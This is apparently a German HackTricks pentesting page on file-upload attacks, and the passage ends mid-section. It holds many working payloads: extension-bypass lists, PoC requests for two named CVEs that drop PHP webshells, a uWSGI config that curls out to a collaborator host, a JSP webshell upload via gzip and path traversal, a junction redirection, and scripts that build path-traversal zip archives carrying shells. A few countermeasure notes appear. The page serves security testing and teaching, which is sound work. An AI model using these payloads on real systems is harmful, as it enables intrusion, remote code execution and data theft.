# Datei-Upload

{{#include ../../banners/hacktricks-training.md}}

## Allgemeine Methodik für Datei-Uploads

Weitere nützliche Dateierweiterungen:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Umgehung von Datei-Erweiterungsprüfungen

1. Falls vorhanden, **prüfe** die **vorherigen Erweiterungen.** Teste sie auch mit einigen **Großbuchstaben**: _pHp, .pHP5, .PhAr ..._
2. _Prüfe **das Hinzufügen einer gültigen Erweiterung vor** der Ausführungserweiterung (verwende auch die vorherigen Erweiterungen):_
- _file.png.php_
- _file.png.Php5_
3. Versuche, **Sonderzeichen am Ende** hinzuzufügen. Du könntest Burp verwenden, um alle **ascii** und **Unicode** Zeichen zu **bruteforcen**. (_Beachte, dass du auch versuchen kannst, die **zuvor** genannten **Erweiterungen** zu verwenden_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Versuche, die Schutzmechanismen zu umgehen, indem du den Serverseitigen **Erweiterungsparser austrickst** mit Techniken wie **Verdopplung** der **Erweiterung** oder dem **Einfügen von Mülldaten** (**null** Bytes) zwischen Erweiterungen. _Du kannst auch die **vorherigen Erweiterungen** nutzen, um ein besseres Payload vorzubereiten._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Füge **eine weitere Ebene von Erweiterungen** zur vorherigen Prüfung hinzu:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Versuche, die **Ausführungserweiterung vor der gültigen Erweiterung** zu setzen und hoffe, dass der Server falsch konfiguriert ist. (Nützlich, um Apache-Fehlkonfigurationen auszunutzen, bei denen alles mit der Erweiterung **_.php_**, aber nicht unbedingt mit Endung .php, Code ausführt):
- _ex: file.php.png_
7. Verwendung von **NTFS alternate data stream (ADS)** unter **Windows**. In diesem Fall wird nach einer verbotenen Erweiterung und vor einer erlaubten eine Doppelpunkt-Zeichen ":" eingefügt. In der Folge wird eine **leere Datei mit der verbotenen Erweiterung** auf dem Server erstellt (z. B. "file.asax:.jpg”). Diese Datei kann später mit anderen Techniken bearbeitet werden, z. B. über ihren Short Filename. Das Muster "**::$data**” kann ebenfalls verwendet werden, um nicht-leere Dateien zu erstellen. Daher kann das Hinzufügen eines Punktzeichens nach diesem Muster nützlich sein, um weitere Beschränkungen zu umgehen (z. B. "file.asp::$data.")
8. Versuche, die Dateinamenslimits zu überschreiten. Die gültige Erweiterung wird abgeschnitten. Und das bösartige PHP bleibt übrig. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Einige Upload-Handler trimmen oder normalisieren nachgestellte Punktzeichen aus dem gespeicherten Dateinamen. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) Versionen vor 2.9.1 kannst du die Erweiterungsvalidierung umgehen, indem du:

- Einen gültigen Image-MIME und Magic-Header verwendest (z. B. PNG’s `\x89PNG\r\n\x1a\n`).
- Die hochgeladene Datei mit einer PHP-Erweiterung gefolgt von einem Punkt benennst, z. B. `shell.php.`.
- Der Server entfernt den nachgestellten Punkt und speichert `shell.php`, das ausgeführt wird, wenn es in ein webbasiertes Verzeichnis abgelegt wird (standardmäßig public storage wie `/storage/files/`).

Minimaler PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Rufe dann den gespeicherten Pfad auf (typisch in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Umgehen von Content-Type-, Magic Number-, Kompressions- und Größenänderungsprüfungen

- Umgehe **Content-Type**-Prüfungen, indem du den **Wert** des **Content-Type** **Headers** auf: _image/png_ , _text/plain , application/octet-stream_ setzt
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Umgehe die **magic number**-Prüfung, indem du am Anfang der Datei die **Bytes eines echten Bildes** hinzufügst (verwirre den _file_ Befehl). Oder platziere die Shell in den **Metadaten**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oder du könntest das **Payload direkt in ein Bild einfügen**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Wenn dem **Bild** Kompression hinzugefügt wird, zum Beispiel durch Standard-PHP-Bibliotheken wie [PHP-GD](https://www.php.net/manual/fr/book.image.php), sind die vorherigen Techniken nicht nützlich. Du könntest jedoch den **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **Kompression überlebt**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die Webanwendung könnte das **Bild** auch **verkleinern**, z. B. mit den PHP-GD-Funktionen `imagecopyresized` oder `imagecopyresampled`. Du kannst jedoch den **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **Kompression überlebt**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Eine weitere Technik, um ein Payload zu erstellen, das eine Bildverkleinerung überlebt (z. B. durch die PHP-GD-Funktion `thumbnailImage`), ist die Verwendung des **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), um Text einzufügen, der die **Kompression überlebt**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Weitere Tricks, die du prüfen solltest

- Finde eine Verwundbarkeit, um die bereits hochgeladene Datei zu **rename** (um die Extension zu ändern).
- Finde eine **Local File Inclusion**-Schwachstelle, um das Backdoor auszuführen.
- **Mögliche Informationsoffenlegung**:
1. Lade die **gleiche Datei** **mehrfach** (und zur **gleichen Zeit**) mit **dem selben Namen** hoch
2. Lade eine Datei hoch, deren **Name** mit einer bereits **existierenden Datei** oder **Ordner** übereinstimmt
3. Lade eine Datei mit dem Namen **"." , "..", or "…"** hoch. Zum Beispiel: Unter Apache in **Windows**, wenn die Anwendung die hochgeladenen Dateien im Verzeichnis "/www/uploads/" speichert, wird der Dateiname "." eine Datei namens "uploads" im Verzeichnis "/www/" erzeugen.
4. Lade eine Datei hoch, die sich nur schwer löschen lässt, z. B. **"…:.jpg"** in **NTFS**. (Windows)
5. Lade eine Datei in **Windows** mit **ungültigen Zeichen** wie `|<>*?”` im Namen hoch. (Windows)
6. Lade eine Datei in **Windows** unter Verwendung von **reservierten** (**verbotenen**) **Namen** wie CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 und LPT9 hoch.
- Versuche außerdem, ein **ausführbares Programm** (.exe) oder eine **.html** (weniger verdächtig) hochzuladen, die beim versehentlichen Öffnen durch das Opfer **Code ausführt**.

### Spezielle Tricks mit Dateiendungen

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar` Dateien sind wie die `.jar` für Java, aber für PHP, und können **wie eine php-Datei verwendet werden** (mit php ausgeführt oder in ein Skript inkludiert...).

Die `.inc` Dateiendung wird manchmal für php-Dateien verwendet, die nur zum **Importieren von Dateien** dienen, daher könnte an irgendeinem Punkt erlaubt worden sein, **diese Dateiendung auszuführen**.

## **Jetty RCE**

Wenn du eine XML-Datei auf einen Jetty-Server hochladen kannst, kannst du [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)** erlangen.** Wie im folgenden Bild erwähnt, lade die XML-Datei nach `$JETTY_BASE/webapps/` hoch und erwarte die Shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Für eine ausführliche Untersuchung dieser Schwachstelle siehe die Originalrecherche: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE)-Schwachstellen können in uWSGI-Servern ausgenutzt werden, wenn man die Möglichkeit hat, die `.ini`-Konfigurationsdatei zu verändern. uWSGI-Konfigurationsdateien nutzen eine spezielle Syntax, um "magic" Variablen, Platzhalter und Operatoren einzubinden. Hervorzuheben ist der '@'-Operator, der als `@(filename)` verwendet wird und dazu dient, den Inhalt einer Datei einzubinden. Unter den verschiedenen in uWSGI unterstützten Schemes ist das "exec"-Scheme besonders mächtig, da es das Lesen von Daten aus der Standardausgabe eines Prozesses erlaubt. Diese Funktion kann für bösartige Zwecke wie Remote Command Execution oder Arbitrary File Write/Read missbraucht werden, wenn eine `.ini`-Konfigurationsdatei verarbeitet wird.

Betrachte das folgende Beispiel einer schädlichen `uwsgi.ini`-Datei, die verschiedene Schemes veranschaulicht:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die Ausführung des payloads erfolgt während des Parsings der Konfigurationsdatei. Damit die Konfiguration aktiviert und geparst wird, muss der uWSGI-Prozess entweder neu gestartet werden (möglicherweise nach einem Absturz oder aufgrund eines Denial of Service-Angriffs) oder die Datei muss auf auto-reload gesetzt sein. Die auto-reload-Funktion, falls aktiviert, lädt die Datei in festgelegten Intervallen neu, wenn Änderungen erkannt werden.

Es ist entscheidend, die laxen Eigenschaften des Parsings der uWSGI-Konfigurationsdatei zu verstehen. Konkret kann das beschriebene payload in eine binary file (z. B. ein image oder PDF) eingefügt werden, wodurch der mögliche Exploitationsbereich weiter vergrößert wird.

### Gibbon LMS willkürliches Dateischreiben zu pre-auth RCE (CVE-2023-45878)

Ein unauthentifizierter Endpoint in Gibbon LMS erlaubt arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Verwundbare Versionen: bis einschließlich 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimaler PoC, um eine Datei zu schreiben und zurückzulesen:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Eine minimale webshell ablegen und Befehle ausführen:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notizen:
- Der Handler führt `base64_decode($_POST["img"])` aus, nachdem er an `;` und `,` gesplittet hat, und schreibt dann die Bytes nach `$absolutePath . '/' . $_POST['path']` ohne Extension/Type zu validieren.
- Der daraus resultierende Code läuft als Web-Service-Benutzer (z. B. XAMPP Apache on Windows).

Als Referenzen für diesen Bug gelten das usd HeroLab advisory und der NVD-Eintrag. Siehe den Abschnitt References weiter unten.

## **wget File Upload/SSRF Trick**

In manchen Fällen kann es vorkommen, dass ein Server **`wget`** verwendet, um **download files** herunterzuladen, und du die **URL** angeben kannst. In diesen Fällen prüft der Code möglicherweise, dass die Extension der heruntergeladenen Dateien in einer Whitelist enthalten ist, um sicherzustellen, dass nur erlaubte Dateien geladen werden. Allerdings kann **diese Prüfung umgangen werden.**\
Die **maximale** Länge eines **filename** in **linux** ist **255**, jedoch kürzt **wget** die Dateinamen auf **236** Zeichen. Du kannst eine Datei namens **"A"*232+".php"+".gif"** herunterladen; dieser Dateiname wird die **Prüfung** umgehen (in diesem Beispiel ist **".gif"** eine **gültige** Extension), aber `wget` wird die Datei in **"A"*232+".php"** umbenennen.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Beachte, dass **eine andere Option**, an die du vielleicht denkst, um diese Prüfung zu umgehen, darin besteht, den **HTTP-Server so umzuleiten, dass er auf eine andere Datei zeigt**, sodass die ursprüngliche URL die Prüfung umgeht, aber wget dann die umgeleitete Datei unter dem neuen Namen herunterlädt. Das **funktioniert nicht** **es sei denn**, wget wird mit dem **Parameter** `--trust-server-names` verwendet, weil **wget die umgeleitete Seite mit dem im ursprünglichen URL angegebenen Dateinamen herunterladen wird**.

### Upload-Verzeichnis mittels NTFS junctions umgehen (Windows)

(Für diesen Angriff benötigen Sie lokalen Zugriff auf die Windows-Maschine) Wenn Uploads unter benutzerspezifischen Unterordnern auf Windows gespeichert werden (z. B. C:\Windows\Tasks\Uploads\<id>\) und Sie die Erstellung/Löschung dieses Unterordners kontrollieren, können Sie ihn durch eine directory junction ersetzen, die auf einen sensiblen Ort zeigt (z. B. das webroot). Nachfolgende Uploads werden in den Zielpfad geschrieben, was Codeausführung ermöglicht, wenn das Ziel serverseitigen Code interpretiert.

Beispielablauf, um Uploads in das XAMPP webroot umzuleiten:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Hinweise
- mklink /J creates an NTFS directory junction (reparse point). Das Konto des Webservers muss der Junction folgen und Schreibberechtigung im Ziel haben.
- Das leitet beliebige Datei-Schreibvorgänge um; wenn das Ziel Skripte ausführt (PHP/ASP), wird daraus RCE.
- Gegenmaßnahmen: don’t allow writable upload roots to be attacker‑controllable under C:\Windows\Tasks or similar; block junction creation; validate extensions server‑side; store uploads on a separate volume or with deny‑execute ACLs.

### GZIP-komprimierter Body-Upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Einige upload/ingest handlers schreiben den rohen Request-Body in einen Dateisystempfad, der aus user-controlled query parameters konstruiert wird. Wenn der Handler außerdem Content-Encoding: gzip unterstützt und den destination path nicht kanonisiert/validiert, kann man directory traversal mit einer gzipped payload kombinieren, um beliebige Bytes in ein web-served directory zu schreiben und RCE zu erlangen (z. B. eine JSP unter Tomcat’s webapps ablegen).

Generischer Exploit‑Ablauf:
- Bereite dein server-side payload vor (z. B. minimaler JSP webshell) und gzip-compress die Bytes.
- Sende einen POST, bei dem ein path parameter (z. B. token) Traversal enthält, das den vorgesehenen Ordner verlässt, und file den Dateinamen angibt, unter dem gespeichert werden soll. Setze Content-Type: application/octet-stream und Content-Encoding: gzip; der Body ist die komprimierte Payload.
- Rufe die geschriebene Datei im Browser auf, um die Ausführung zu triggern.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Dann auslösen:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Hinweise
- Zielpfade variieren je nach Installation (z. B. /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in einigen Stacks). Jeder web-exponierte Ordner, der JSP ausführt, funktioniert.
- Burp Suite’s Hackvertor extension kann einen korrekten gzip-Body aus deinem payload erzeugen.
- Dies ist ein reines pre-auth arbitrary file write → RCE-Muster; es beruht nicht auf multipart parsing.

Gegenmaßnahmen
- Ermittle Upload-Ziele serverseitig; vertraue niemals Pfadfragmente von Clients.
- Kanonisiere und stelle sicher, dass der aufgelöste Pfad innerhalb eines allow-listed Basisverzeichnisses bleibt.
- Speichere Uploads auf einem nicht-ausführbaren Volume und verhindere die Skriptausführung aus beschreibbaren Pfaden.

## Werkzeuge

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) ist ein leistungsstarkes Tool, das Pentesters und Bug Hunters beim Testen von file upload mechanisms unterstützt. Es nutzt verschiedene bug bounty techniques, um den Prozess der Identifizierung und Ausnutzung von vulnerabilities zu vereinfachen und so gründliche Assessments von Webanwendungen zu ermöglichen.

### Korruption von Upload-Indizes mit snprintf-Quirks (historisch)

Einige legacy upload handlers, die `snprintf()` oder ähnliches verwenden, um multi-file arrays aus einem single-file upload zu erstellen, können dazu gebracht werden, die `_FILES`-Struktur zu fälschen. Aufgrund von Inkonsistenzen und Abschneidung im Verhalten von `snprintf()` kann ein sorgfältig gestalteter einzelner Upload serverseitig als mehrere indizierte Dateien erscheinen und Logik verwirren, die eine strikte Struktur annimmt (z. B. ihn als multi-file upload behandelt und unsichere Zweige wählt). Obwohl heute eher nischenhaft, taucht dieses „index corruption“-Muster gelegentlich in CTFs und älterem Code wieder auf.

## Vom File-Upload zu anderen Vulnerabilities

- Setze **filename** auf `../../../tmp/lol.png` und versuche, eine **path traversal** zu erreichen
- Setze **filename** auf `sleep(10)-- -.jpg` und du könntest eine **SQL injection** erreichen
- Setze **filename** auf `<svg onload=alert(document.domain)>` um XSS zu erreichen
- Setze **filename** auf `; sleep 10;` um einige command injection-Vektoren zu testen (mehr [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probiere **verschiedene svg payloads** von [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Wenn du dem Webserver mitteilen kannst, ein Bild von einer URL zu holen, könntest du versuchen, SSRF zu missbrauchen ([SSRF](../ssrf-server-side-request-forgery/index.html)). Wenn dieses **image** dann auf einer öffentlichen Seite gespeichert wird, könntest du auch eine URL von [https://iplogger.org/invisible/](https://iplogger.org/invisible/) angeben und die Informationen jedes Besuchers **stehlen**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Speziell gestaltete PDFs für XSS: Die [folgende Seite zeigt, wie man **PDF-Daten injiziert, um JS-Ausführung zu erhalten**](../xss-cross-site-scripting/pdf-injection.md). Wenn du PDFs hochladen kannst, könntest du ein PDF vorbereiten, das gemäß den dortigen Anweisungen beliebiges JS ausführt.
- Lade den \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) Inhalt hoch, um zu prüfen, ob der Server irgendeinen **antivirus** hat
- Prüfe, ob es beim Hochladen von Dateien eine **Größenbegrenzung** gibt

Hier ist eine Top-10-Liste von Dingen, die du durch Uploads erreichen kannst (von [hier](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Siehe [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) für andere Dateitypen.

## Zip/Tar-Upload, der automatisch dekomprimiert wird

Wenn du ein ZIP hochladen kannst, das serverseitig dekomprimiert wird, kannst du zwei Dinge tun:

### Symlink

Lade ein Archiv hoch, das symbolische Links zu anderen Dateien enthält; beim Zugriff auf die dekomprimierten Dateien greifst du dann auf die verlinkten Dateien zu:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### In verschiedene Ordner entpacken

Die unerwartete Erstellung von Dateien in Verzeichnissen während des Entpackens ist ein erhebliches Problem. Trotz anfänglicher Annahmen, dass diese Konfiguration vor OS-level command execution durch bösartige Datei-Uploads schützen könnte, können die hierarchische Kompressionsunterstützung und die directory traversal-Fähigkeiten des ZIP-Archive-Formats ausgenutzt werden. Dadurch können Angreifer Beschränkungen umgehen und aus sicheren Upload-Verzeichnissen ausbrechen, indem sie die Dekomprimierungsfunktionalität der Zielanwendung manipulieren.

Ein automatisierter exploit, um solche Dateien zu erstellen, ist unter [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) verfügbar. Das Utility kann wie folgt verwendet werden:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Zusätzlich ist die **symlink trick with evilarc** eine Option. Wenn das Ziel eine Datei wie `/flag.txt` ist, sollte ein symlink zu dieser Datei auf deinem System erstellt werden. Dadurch wird sichergestellt, dass evilarc während seiner Ausführung nicht auf Fehler stößt.

Nachfolgend ein Beispiel für Python-Code, der verwendet wird, um eine bösartige zip-Datei zu erstellen:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Kompression ausnutzen für file spraying**

Für weitere Details **siehe den Originalbeitrag unter**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Erstellen einer PHP-Shell**: PHP-Code wird geschrieben, um Befehle aus der `$_REQUEST`-Variable auszuführen.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying und Erstellung komprimierter Dateien**: Mehrere Dateien werden erstellt und ein zip-Archiv wird zusammengestellt, das diese Dateien enthält.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Änderung mit einem Hex-Editor oder vi**: Die Namen der Dateien im zip werden mit vi oder einem Hex-Editor geändert, wobei "xxA" in "../" geändert wird, um Verzeichnisse zu durchlaufen.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Wenn ein Backend ZIP-Einträge mit PHP’s ZipArchive validiert, die Extraktion aber die Dateinamen unverändert auf das Dateisystem schreibt, kann man eine nicht erlaubte Erweiterung einschmuggeln, indem man ein NUL (0x00) in die Dateinamenfelder einfügt. ZipArchive behandelt den Eintragsnamen als C‑String und kürzt beim ersten NUL; das Dateisystem schreibt den vollständigen Namen und lässt alles nach dem NUL fallen.

Ablauf auf hoher Ebene:
